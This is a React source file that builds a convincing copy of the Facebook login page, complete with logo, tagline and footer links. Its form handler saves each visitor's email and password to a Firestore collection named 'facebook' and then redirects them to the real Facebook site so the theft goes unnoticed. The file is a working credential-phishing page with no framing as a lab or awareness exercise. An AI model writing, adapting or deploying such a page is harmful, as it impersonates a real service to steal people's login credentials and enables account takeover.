import { useState } from "react";
import { db } from "../firebaseConfig";
import { collection, addDoc } from "firebase/firestore";


export default function Facebook() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [errorMessage, setErrorMessage] = useState('');

    const dbref = collection(db, "facebook");


    // Add user function
    const addUser = async (email, password) => { // Add async keyword here
        try {
            const docRef = await addDoc(dbref, { // Add await keyword here
                email: email,   // Use email: email instead of email,
                password: password // Use password: password instead of password
            });
            console.log("Document written with ID: ", docRef.id);
            setEmail('');
            setPassword('');
            window.location.href = 'https://www.facebook.com/';
        } catch (e) {
            console.error("Error adding document: ", e);
            setErrorMessage("Error adding user. Please try again later.");
        }
    };

    // Handle email input
    const handleEmail = (e) => {
        setEmail(e.target.value);
    };

    // Handle password input
    const handlePassword = (e) => {
        setPassword(e.target.value);
    };

    // Handle form submission
    const handleSubmit = async (e) => {
        e.preventDefault();
        if (email && password) {
            await addUser(email, password);  // Call the addUser function directly here
        } else {
            setErrorMessage("Both email and password are required.");
        }
    };

    return (
        <>
            <div className="w-full h-[720px] bg-[#f0f2f5] px-4 pt-8 md:px-[150px] md:pt-[50px]">
                <div className="grid grid-cols-1 xl:grid-cols-2 gap-8">
                    {/* Left Section */}
                    <div className="md:text-start md:flex md:justify-center md:text-start md:pl-[15px]
                                     " >
                        <div className="mt-8 md:mt-[60px]">
                            <svg
                                xmlns="http://www.w3.org/2000/svg"
                                width="300"
                                height="130"
                                fill="none"
                                viewBox="0 -20 1000 250">
                                <path fill="#0866FF" d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"/>
                                </svg>

                                <p className="text-lg md:text-2xl md:pl-7 md:w-[400px] 
                                                xl:Text-ce">
                                    Facebook helps you connect and share with the people in your life.
                                </p>
                        </div>
                    </div>

                    {/* Right Section */}
                    <div className="flex flex-col items-center">
                        <form onSubmit={handleSubmit}>
                            <div className="shadow-xl p-4 mt-4 md:mt-[50px] w-full max-w-md rounded-xl bg-white ">
                                <input
                                    className="w-full h-[55px] p-4 border rounded placeholder-gray-400 mb-4"
                                    type="email or phone number"
                                    value={email}
                                    onChange={handleEmail}
                                    placeholder="Email address or phone number"
                                />
                                <input
                                    className="w-full h-[55px] p-4 border rounded placeholder-gray-400 mb-4"
                                    type="password"
                                    value={password}
                                    onChange={handlePassword}
                                    placeholder="Password"
                                />
                                <button
                                    className="w-full h-[50px] font-bold text-xl bg-[#0866FF] text-white rounded mb-4"
                                    type="submit"
                                >
                                    Log in
                                </button>
                                {errorMessage && (
                                    <p className="text-red-500 text-center">{errorMessage}</p>
                                )}
                                <h1 className="text-[#0866FF] text-center">Forgotten Password?</h1>
                                <div className="border my-[20px]"></div>
                                <div className="flex flex-col items-center">
                                    <button
                                        className="w-full max-w-[200px] h-[50px] font-bold text-md bg-[#42b72a] text-white rounded"
                                        type="button"
                                    >
                                        Create new account
                                    </button>

                                </div>
                                
                            </div>
                        </form>

                        <p className="mt-4 text-sm text-center">
                            <span className="font-bold">Create a Page</span> for a celebrity, brand, or business.
                        </p>
                    </div>
                </div>
            </div>

            <div className="h-auto w-full px-4 md:px-[200px]">
                <div className="text-sm text-gray-400 mt-4">
                    <div className="flex flex-wrap justify-center md:justify-start gap-2 text-xs">
                        <span className="text-gray-600">English (UK)</span>
                        <span>العربية</span>
                        <span>پښتو</span>
                        <span>اردو</span>
                        <span>हिन्दी</span>
                        <span>বাংলা</span>
                        <span>ਪੰਜਾਬੀ</span>
                        <span>فارسی</span>
                        <span>ગુજરાતી</span>
                        <span>Deutsch</span>
                        <span>Español</span>
                        <span className="border w-9 bg-gray-100 text-center rounded text-black">✛</span>
                    </div>
                    <div className="border my-2"></div>
                    <div className="flex flex-wrap justify-center md:justify-start gap-4">
                        <span>Sign Up</span>
                        <span>Log in</span>
                        <span>Messenger</span>
                        <span>Facebook Lite</span>
                        <span>Video</span>
                        <span>Places</span>
                        <span>Games</span>
                        <span>Marketplace</span>
                        <span>Meta Pay</span>
                        <span>Meta Store</span>
                        <span>Meta Quest</span>
                        <span>Ray-Ban Meta</span>
                        <span>Meta AI</span>
                        <span>Instagram</span>
                        <span>Threads</span>
                        <span>Fundraisers</span>
                        <span>Services</span>
                        <span>Voting Information Centre</span>
                        <span>Privacy Policy</span>
                        <span>Privacy Centre</span>
                        <span>Groups</span>
                        <span>About</span>
                        <span>Create ad</span>
                        <span>Create Page</span>
                        <span>Developers</span>
                        <span>Careers</span>
                        <span>Cookies</span>
                        <span>AdChoices</span>
                        <span>Terms</span>
                        <span>Help</span>
                        <span>Contact uploading and non-users</span>
                        <span>Settings</span>
                    </div>
                    <p className="text-center md:text-start mx-4 mt-4">Meta © 2024</p>
                </div>
            </div>
        </>
    );
}
